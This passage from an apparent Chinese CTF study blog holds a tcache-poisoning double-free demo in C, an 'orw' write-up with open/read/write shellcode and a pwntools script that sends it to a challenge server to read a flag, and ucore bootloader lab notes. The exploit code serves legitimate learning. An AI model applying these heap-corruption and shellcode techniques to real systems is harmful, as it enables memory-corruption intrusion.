class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>     <br>    <span class="hljs-comment">// cause chunk overlapping</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>     <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);<br>    <span class="hljs-built_in">free</span>(prev);<br>     <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>     <br>    <span class="hljs-comment">// simple tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);<br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br>     <br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);<br>     <br>    <span class="hljs-comment">// sanity check</span><br>    assert(c==stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>     <br>    <span class="hljs-comment">// note</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> 思路</p><p>1.先malloc出7个tcache填充tchache bin</p><p>2.malloc一个pre chunk 一个victim chunk 一个小chunk 防止被topchunk合并</p><p>3.free掉victim chunk，pre chunk 然后会进入到unsorted bin 中，并进行合并</p><p>4.利用double free，先malloc一个chunk让tcache有空位，然后再free victim chunk 让他进入到tcache chunk</p><p>5.利用堆溢出，让他能够溢出，改写victim chunk 的fd （题中malloc 的b应该是从unsorted bin 里取出来的，然后它就可以重叠控制到victim chunk 然后victim chunk 就会把）</p><p>6.malloc两次之后就可以得到目标地址（应该是修改fd指针之后，导致tcache链表发生改变，根据tcache bin 的先进后出，第一次malloc 会获得victim chunk ，再次malloc 会获得 target ，需要实操验证一下）</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>练习学习之后还需要找到相应的题目进行练习，不然学完就忘，遇见了也想不起来</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnable_orw(需要写入shellcode)</title>
    <link href="/2021/10/01/pwnable_orw/"/>
    <url>/2021/10/01/pwnable_orw/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/orw.png" alt="orw-1"></p><p>需要自己写入一段shellcode。</p><p>但这道题的特殊之处就在于，这道题调用<code>**orw_seccomp**</code>函数后，会禁止一些系统调用，只会保留一些安全的系统调用。</p><p><img src="/img/orw-2.png" alt="orw-2"></p><p> <strong>seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 syscall，只允许使用部分 syscall。</p><p>这道题为我们保留了 open，read，write函数的调用，即我们可以打开flag文件，然后读出flag</p><p> 然而写一段汇编代码并不像直接写c语言那么简单</p><h4 id="1，sys-open-const-char-user-filename-int-flags-int-mode"><a href="#1，sys-open-const-char-user-filename-int-flags-int-mode" class="headerlink" title="1，sys_open(const char __user *filename, int flags, int mode)"></a>1，sys_open(const char __user *filename, int flags, int mode)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x0            #/x00<br>push 0x67616c66     #&#x27;flags&#x27;小端序<br>mov ebx,esp        <br>xor ecx,ecx         #0<br>xor edx,edx         #0<br>mov eax,0x5         #调用号<br>int 0x80            #sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><h4 id="2-sys-read-unsigned-int-fd-char-user-buf-size-t-count"><a href="#2-sys-read-unsigned-int-fd-char-user-buf-size-t-count" class="headerlink" title="2.sys_read(unsigned int fd, char __user * buf, size_t count)"></a>2.sys_read(unsigned int fd, char __user * buf, size_t count)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x3;<br>mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x102;  #对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure><h4 id="3-sys-write-unsigned-int-fd-const-char-user-buf-size-t-count"><a href="#3-sys-write-unsigned-int-fd-const-char-user-buf-size-t-count" class="headerlink" title="3.sys_write(unsigned int, fd, const char __user *, buf, size_t, count))"></a>3.sys_write(unsigned int, fd, const char __user *, buf, size_t, count))</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x4;    # eax = sys_write<br>mov ebx,0x1;    # ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure><p> 当然，wp中还有一个更简单的办法，让pwntools代你写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29213</span>)<br> <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;orw&#x27;</span>)<br> <br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode = asm(shellcode)<br> <br>r.sendline(shellcode)<br> <br>r.interactive()<br></code></pre></td></tr></table></figure><p>这道题算是让我长见识了，挺有趣的一道题，学到了不少。但以我个人目前的实力来看，单独做出来应该是比较困难的，还需要继续学习，看一看题。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ucore_lab1</title>
    <link href="/2021/09/18/ucore_lab1/"/>
    <url>/2021/09/18/ucore_lab1/</url>
    
    <content type="html"><![CDATA[<p>挖下一个大坑，不知道什么时候能够学完。</p><p>ucore的lab1并不难，每个练习的思路也很清晰。lab1学完，并看了他人的笔记巩固。写下自己的理解。</p><p>80386型CPU开机的流程：先执行在bios中的程序，但由于bios容量很小，不能完成所有的工作，也不具备更高的拓展性，所以他读取磁盘中第一个扇区(引导扇区)中的内容，将其加载至内存地址空间0x7c00处。之后将cs：ip指向0x7c00处，并执行引导程序的第一条指令。</p><h1 id="练习一-："><a href="#练习一-：" class="headerlink" title="练习一 ："></a>练习一 ：</h1><h2 id="操作系统镜像文件ucore-img是如何一步一步生成的？"><a href="#操作系统镜像文件ucore-img是如何一步一步生成的？" class="headerlink" title="操作系统镜像文件ucore.img是如何一步一步生成的？"></a><strong>操作系统镜像文件ucore.img是如何一步一步生成的？</strong></h2><p>   调用gcc把.c源码编译成了.o目标文件。然后通过ld 让这些目标文件转换为.out可执行文件</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">B<span class="hljs-function"><span class="hljs-title">ootasm</span>.s bootmain.c-&gt;</span>B<span class="hljs-function"><span class="hljs-title">ootasm</span>.o bootmain.o -&gt;</span><span class="hljs-function"><span class="hljs-title">bootblock</span>.out -&gt;</span>(<span class="hljs-function"><span class="hljs-title">sign</span> 处理)bootblock           Kernel.ld init.o readline.o stdio.o kdebug.o -&gt;</span>kernel<br>B<span class="hljs-function"><span class="hljs-title">ootblock</span> + kernel -&gt;</span>ucore.img<br></code></pre></td></tr></table></figure><h2 id="一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？"><a href="#一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？" class="headerlink" title="一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？"></a><strong>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</strong></h2><p>  在sign.c文件中： 一个主引导扇区必须是512字节，且第510字节是0x55 第511为0xAA</p><p>当bios工作完成后，cpu的控制权移交给了ucore的引导程序bootloader，并由bootloader完成一些初始的操作：将cpu从实模式进入到保护模式，初始化GDT表</p><h1 id="练习3"><a href="#练习3" class="headerlink" title="练习3:"></a>练习3:</h1><h2 id="为何开启A20，以及如何开启A20？"><a href="#为何开启A20，以及如何开启A20？" class="headerlink" title="为何开启A20，以及如何开启A20？"></a><strong>为何开启A20，以及如何开启A20？</strong></h2><blockquote><p>在早期的8086CPU中，内存总线是20位的，由高16位的段基址和低16位的段内偏移共同构成一个20位的内存地址，而为了进入32位的保护模式，我们需要开启A20（第二十一位内存访问总线）</p></blockquote><h2 id="如何初始化GDT表？"><a href="#如何初始化GDT表？" class="headerlink" title="如何初始化GDT表？"></a><strong>如何初始化GDT表？</strong></h2><p> GDT表及其描述符已经在引导区中，载入即可。</p><h2 id="如何进入保护模式？"><a href="#如何进入保护模式？" class="headerlink" title="如何进入保护模式？"></a><strong>如何进入保护模式？</strong></h2><p> Cr0寄存器PE位置1就开启了保护模式</p><h3 id="bootasm-S"><a href="#bootasm-S" class="headerlink" title="bootasm.S"></a>bootasm.S</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="hljs-comment"># The BIOS loads this code from the first sector of the hard disk into</span><br><span class="hljs-comment"># memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="hljs-comment"># with %cs=0 %ip=7c00.</span><br> <br>.set PROT_MODE_CSEG,        <span class="hljs-number">0x8</span>                     <span class="hljs-comment"># kernel code segment selector</span><br>.set PROT_MODE_DSEG,        <span class="hljs-number">0x10</span>                    <span class="hljs-comment"># kernel data segment selector</span><br>.set CR0_PE_ON,             <span class="hljs-number">0x1</span>                     <span class="hljs-comment"># protected mode enable flag</span><br> <br><span class="hljs-comment"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br>.globl start<br>start:<br>.code16                              <span class="hljs-comment"># Assemble for 16-bit mode   清理环境，将一些寄存器置为0</span><br>    cli                                             <span class="hljs-comment"># Disable interrupts</span><br>    cld                                             <span class="hljs-comment"># String operations increment</span><br> <br>    <span class="hljs-comment"># Set up the important data segment registers (DS, ES, SS).</span><br>    xorw %ax, %ax                                   <span class="hljs-comment"># Segment number zero</span><br>    movw %ax, %ds                                   <span class="hljs-comment"># -&gt; Data Segment</span><br>    movw %ax, %es                                   <span class="hljs-comment"># -&gt; Extra Segment</span><br>    movw %ax, %ss                                   <span class="hljs-comment"># -&gt; Stack Segment</span><br> <br>    <span class="hljs-comment"># Enable A20:</span><br>    <span class="hljs-comment">#  For backwards compatibility with the earliest PCs, physical</span><br>    <span class="hljs-comment">#  address line 20 is tied low, so that addresses higher than</span><br>    <span class="hljs-comment">#  1MB wrap around to zero by default. This code undoes this</span><br></code></pre></td></tr></table></figure><p>bootloader引导程序是位于设备的第一个扇区，即引导扇区的，而ucore的内核程序则是从第二个磁盘扇区开始往后存放的。bootmain.c的任务就是将kernel内核部分从磁盘中读出并载入内存，并将程序的控制流转移至指定的内核入口处。</p><p>ucore的内核文件在生成磁盘映像时是以<strong>ELF</strong>格式保存的</p><h2 id="分析bootloader加载ELF格式的OS的过程："><a href="#分析bootloader加载ELF格式的OS的过程：" class="headerlink" title="分析bootloader加载ELF格式的OS的过程："></a><strong>分析bootloader加载ELF格式的OS的过程：</strong></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bootmain.c<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;defs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;elf.h&gt;</span></span><br> <br><span class="hljs-comment">/* *********************************************************************</span><br><span class="hljs-comment"> * This a dirt simple boot loader, whose sole job is to boot</span><br><span class="hljs-comment"> * an ELF kernel image from the first IDE hard disk.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * DISK LAYOUT</span><br><span class="hljs-comment"> *  * This program(bootasm.S and bootmain.c) is the bootloader.</span><br><span class="hljs-comment"> *    It should be stored in the first sector of the disk.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * The 2nd sector onward holds the kernel image.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * The kernel image must be in ELF format.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * BOOT UP STEPS</span><br><span class="hljs-comment"> *  * when the CPU boots it loads the BIOS into memory and executes it</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * the BIOS intializes devices, sets of the interrupt routines, and</span><br><span class="hljs-comment"> *    reads the first sector of the boot device(e.g., hard-drive)</span><br><span class="hljs-comment"> *    into memory and jumps to it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * Assuming this boot loader is stored in the first sector of the</span><br><span class="hljs-comment"> *    hard-drive, this code takes over...</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * control starts in bootasm.S -- which sets up protected mode,</span><br><span class="hljs-comment"> *    and a stack so C code then run, then calls bootmain()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  * bootmain() in this file takes over, reads in the kernel and jumps to it.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    SECTSIZE  =      <span class="hljs-number">512</span> ;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">elfhdr</span> * ELFHDR    =      ((<span class="hljs-keyword">struct</span> elfhdr *)<span class="hljs-number">0x10000</span>) ;     <span class="hljs-comment">// scratch space</span><br> <br><span class="hljs-comment">/* waitdisk - wait for disk ready */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">waitdisk</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">inb</span>(<span class="hljs-number">0x1F7</span>) &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x40</span>)<br>        <span class="hljs-comment">/* do nothing */</span>;<br>&#125;<br> <br><span class="hljs-comment">/* readsect - read a single sector at @secno into @dst */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">readsect</span><span class="hljs-params">(<span class="hljs-type">void</span> *dst, <span class="hljs-type">uint32_t</span> secno)</span> </span>&#123;    readsect从设备的第secno扇区读取数据到dst位置<br>    <span class="hljs-comment">// wait for disk to be ready</span><br>    <span class="hljs-built_in">waitdisk</span>();<br> <br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F2</span>, <span class="hljs-number">1</span>);                         <span class="hljs-comment">// count = 1</span><br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F3</span>, secno &amp; <span class="hljs-number">0xFF</span>);<br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F4</span>, (secno &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F5</span>, (secno &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F6</span>, ((secno &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xF</span>) | <span class="hljs-number">0xE0</span>);<br>    <span class="hljs-built_in">outb</span>(<span class="hljs-number">0x1F7</span>, <span class="hljs-number">0x20</span>);                      <span class="hljs-comment">// cmd 0x20 - read sectors</span><br> <br>    <span class="hljs-comment">// wait for disk to be ready</span><br>    <span class="hljs-built_in">waitdisk</span>();<br> <br>    <span class="hljs-comment">// read a sector</span><br>    <span class="hljs-built_in">insl</span>(<span class="hljs-number">0x1F0</span>, dst, SECTSIZE / <span class="hljs-number">4</span>);<br>&#125;<br> <br><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * readseg - read @count bytes at @offset from kernel into virtual address @va,</span><br><span class="hljs-comment"> * might copy more than asked.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">readseg</span><span class="hljs-params">(<span class="hljs-type">uintptr_t</span> va, <span class="hljs-type">uint32_t</span> count, <span class="hljs-type">uint32_t</span> offset)</span> </span>&#123;   readseg简单包装了readsect，可以从设备读取任意长度的内容。<br>    <span class="hljs-type">uintptr_t</span> end_va = va + count;<br> <br>    <span class="hljs-comment">// round down to sector boundary</span><br>    va -= offset % SECTSIZE;<br> <br>    <span class="hljs-comment">// translate from bytes to sectors; kernel starts at sector 1</span><br>    <span class="hljs-type">uint32_t</span> secno = (offset / SECTSIZE) + <span class="hljs-number">1</span>;<br> <br>    <span class="hljs-comment">// If this is too slow, we could read lots of sectors at a time.</span><br>    <span class="hljs-comment">// We&#x27;d write more to memory than asked, but it doesn&#x27;t matter --</span><br>    <span class="hljs-comment">// we load in increasing order.</span><br>    <span class="hljs-keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;<br>        <span class="hljs-built_in">readsect</span>((<span class="hljs-type">void</span> *)va, secno);<br>    &#125;<br>&#125;<br> <br><span class="hljs-comment">/* bootmain - the entry of bootloader */</span><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">bootmain</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// read the 1st page off disk  读取elf文件的头部</span><br>    <span class="hljs-built_in">readseg</span>((<span class="hljs-type">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">// is this a valid ELF?   检查是否一个合格的ELF文件</span><br>    <span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;<br>        <span class="hljs-keyword">goto</span> bad;<br>    &#125;<br> <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">proghdr</span> *ph, *eph;<br> <br>    <span class="hljs-comment">// load each program segment (ignores ph flags)</span><br>    ph = (<span class="hljs-keyword">struct</span> proghdr *)((<span class="hljs-type">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);<br>    eph = ph + ELFHDR-&gt;e_phnum;<br>    <span class="hljs-keyword">for</span> (; ph &lt; eph; ph ++) &#123;<br>        <span class="hljs-built_in">readseg</span>(ph-&gt;p_va &amp; <span class="hljs-number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);<br>    &#125;<br> <br>    <span class="hljs-comment">// call the entry point from the ELF header</span><br>    <span class="hljs-comment">// note: does not return</span><br>    ((<span class="hljs-built_in">void</span> (*)(<span class="hljs-type">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="hljs-number">0xFFFFFF</span>))();<br> <br>bad:<br>    <span class="hljs-built_in">outw</span>(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8A00</span>);<br>    <span class="hljs-built_in">outw</span>(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8E00</span>);<br> <br>    <span class="hljs-comment">/* do nothing */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在引导程序bootloader将ucore的kernel加载至内存后，将cs:ip跳转至内核入口，接下来就开始进行内核的初始化操作，即&#x2F;kern&#x2F;init.c中的kern_init函数。</p><p>kern_init函数是内核的总控函数，内核中的各个组成部分都在kern_init函数中完成初始化。</p><p>（取经他人的补充）</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;defs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;console.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdebug.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;picirq.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;trap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;clock.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pmm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kmonitor.h&gt;</span></span><br><span 